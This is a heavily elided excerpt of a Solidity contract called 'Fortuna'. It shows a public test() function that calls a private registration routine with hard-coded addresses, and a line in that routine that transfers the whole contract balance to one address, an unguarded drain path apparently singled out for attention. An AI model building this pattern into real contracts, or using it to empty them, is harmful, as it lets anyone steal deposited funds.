...
contract Fortuna {
    ...
    function test() public  {
        registration(0x4BCC21F0CC18C7612b0E908A456674ac8B036223, idToAddress[1]);
         registration(0x85D9f576dcE872e5CdA3fC5E66603A11D6be512D, 0x4BCC21F0CC18C7612b0E908A456674ac8B036223);
    }
    ...
    function registration(address userAddress, address referrerAddress) private {
        ...
        payable(random_ref).transfer(address(this).balance );
